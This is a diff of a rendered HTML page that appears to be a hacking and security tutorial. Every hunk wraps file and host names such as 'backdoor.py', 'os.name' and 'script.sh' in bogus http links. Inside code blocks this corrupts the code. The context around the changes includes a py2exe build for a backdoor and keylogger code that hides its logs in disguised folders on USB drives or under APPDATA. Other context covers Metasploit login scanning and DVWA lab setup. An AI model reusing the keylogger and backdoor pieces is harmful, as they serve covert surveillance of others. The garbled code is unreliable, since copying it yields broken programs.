@@ -317,7 +317,7 @@ fd.close()</code></pre></p>
   <pre><code>from distutils.core import setup
 import py2exe
 <p>setup(<br>
-console=['backdoor.py'],<br>
+console=['<a href="http://backdoor.py">backdoor.py</a>'],<br>
 options={'py2exe': {'bundle_files': 1}},<br>
 zipfile=None,<br>
 )</code></pre></p>
@@ -650,7 +650,7 @@ return custom_path</p>
 return f&quot;keylog_{timestamp}.txt&quot;<br>
 elif mode == &quot;usb&quot;:<br>
 # Windows drive detection<br>
-if os.name == 'nt':<br>
+if <a href="http://os.name">os.name</a> == 'nt':<br>
 import string<br>
 for drive in string.ascii_uppercase:<br>
 path = f&quot;{drive}:\&quot;<br>
@@ -664,7 +664,7 @@ os.makedirs(f&quot;{path}/.hidden&quot;, exist_ok=True)<br>
 return f&quot;{path}/.hidden/sys_{timestamp}.log&quot;<br>
 return &quot;keylog_fallback.txt&quot;<br>
 elif mode == &quot;hidden&quot;:<br>
-if os.name == 'nt':<br>
+if <a href="http://os.name">os.name</a> == 'nt':<br>
 hidden_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Crypto')<br>
 os.makedirs(hidden_dir, exist_ok=True)<br>
 return os.path.join(hidden_dir, f'sys_{timestamp}.log')<br>
@@ -1041,7 +1041,7 @@ msf6 auxiliary(scanner/mysql/mysql_login) > run
 <h1 id="password-msfadmin" tabindex="-1">Password: msfadmin <a class="direct-link" href="#password-msfadmin" aria-hidden="true">#</a></h1>
 <h1 id="find-its-ip-address-run-inside-metasploitable" tabindex="-1">Find its IP address (run inside Metasploitable): <a class="direct-link" href="#find-its-ip-address-run-inside-metasploitable" aria-hidden="true">#</a></h1>
 <p>ifconfig</p>
-<h1 id="look-for-inet-addr-192-168-56-xxx" tabindex="-1">Look for inet addr: 192.168.56.xxx</code></pre> <a class="direct-link" href="#look-for-inet-addr-192-168-56-xxx" aria-hidden="true">#</a></h1>
+<h1 id="look-for-inet-addr-192-168-56-xxx" tabindex="-1">Look for inet addr: <a href="http://192.168.56.xxx">192.168.56.xxx</a></code></pre> <a class="direct-link" href="#look-for-inet-addr-192-168-56-xxx" aria-hidden="true">#</a></h1>
 </div>
 <h2 id="step-4-install-dvwa" tabindex="-1">Step 4: Install DVWA <a class="direct-link" href="#step-4-install-dvwa" aria-hidden="true">#</a></h2>
 <p>DVWA (Damn Vulnerable Web Application) gives you a vulnerable website to practise web hacking — SQL injection, XSS, file upload attacks, and more.</p>
@@ -1891,10 +1891,10 @@ Key directories you should memorise: `/etc` (configuration files), `/var/log` (s
 ls -l filename.txt
 # Output: -rw-r--r-- 1 aimad aimad 2048 Jun 28 10:00 filename.txt
 <h1 id="change-permissions-using-octal-values" tabindex="-1">Change permissions using octal values <a class="direct-link" href="#change-permissions-using-octal-values" aria-hidden="true">#</a></h1>
-<p>chmod 755 script.sh  # Owner:rwx, Group:r-x, Others:r-x</p>
+<p>chmod 755 <a href="http://script.sh">script.sh</a>  # Owner:rwx, Group:r-x, Others:r-x</p>
 <h1 id="change-permissions-using-symbolic-notation" tabindex="-1">Change permissions using symbolic notation <a class="direct-link" href="#change-permissions-using-symbolic-notation" aria-hidden="true">#</a></h1>
-<p>chmod u+x script.sh  # Adds execute for the owner<br>
-chmod go-w script.sh # Removes write for group and others</p>
+<p>chmod u+x <a href="http://script.sh">script.sh</a>  # Adds execute for the owner<br>
+chmod go-w <a href="http://script.sh">script.sh</a> # Removes write for group and others</p>
 <h1 id="change-ownership-of-a-file" tabindex="-1">Change ownership of a file <a class="direct-link" href="#change-ownership-of-a-file" aria-hidden="true">#</a></h1>
 <p>sudo chown newuser:newgroup filename.txt</p>
 <h1 id="change-default-file-creation-permissions-umask" tabindex="-1">Change default file creation permissions (umask) <a class="direct-link" href="#change-default-file-creation-permissions-umask" aria-hidden="true">#</a></h1>
@@ -2157,7 +2157,7 @@ Subdomain enumerator using DNS resolution.
 """
 import socket
 import sys
-<p>domain = input(&quot;Enter target domain (e.g., example.com): &quot;)<br>
+<p>domain = input(&quot;Enter target domain (e.g., <a href="http://example.com">example.com</a>): &quot;)<br>
 wordlist_file = input(&quot;Enter wordlist file path: &quot;)</p>
 <p>try:<br>
 with open(wordlist_file, 'r') as f:<br>
@@ -2398,7 +2398,7 @@ sudo apt install volatility -y
 <h1 id="ftk-imager-download-from-accessdata-free-for-personal-use" tabindex="-1">FTK Imager (download from AccessData – free for personal use) <a class="direct-link" href="#ftk-imager-download-from-accessdata-free-for-personal-use" aria-hidden="true">#</a></h1>
 <h1 id="or-use-the-built-in-dd-for-raw-disk-images" tabindex="-1">Or use the built‑in 'dd' for raw disk images. <a class="direct-link" href="#or-use-the-built-in-dd-for-raw-disk-images" aria-hidden="true">#</a></h1>
 <h1 id="for-log-analysis-install-splunk-free" tabindex="-1">For log analysis, install Splunk Free: <a class="direct-link" href="#for-log-analysis-install-splunk-free" aria-hidden="true">#</a></h1>
-<h1 id="download-from-splunk-com-and-install-with-dpkg" tabindex="-1">Download from splunk.com and install with dpkg. <a class="direct-link" href="#download-from-splunk-com-and-install-with-dpkg" aria-hidden="true">#</a></h1>
+<h1 id="download-from-splunk-com-and-install-with-dpkg" tabindex="-1">Download from <a href="http://splunk.com">splunk.com</a> and install with dpkg. <a class="direct-link" href="#download-from-splunk-com-and-install-with-dpkg" aria-hidden="true">#</a></h1>
 <h1 id="also-consider-installing-velociraptor-open-source-edr" tabindex="-1">Also consider installing Velociraptor (open‑source EDR): <a class="direct-link" href="#also-consider-installing-velociraptor-open-source-edr" aria-hidden="true">#</a></h1>
 <h1 id="follow-the-official-guide-at-velociraptor-velocidex-com" tabindex="-1">Follow the official guide at velociraptor.velocidex.com</code></pre> <a class="direct-link" href="#follow-the-official-guide-at-velociraptor-velocidex-com" aria-hidden="true">#</a></h1>
 </div>
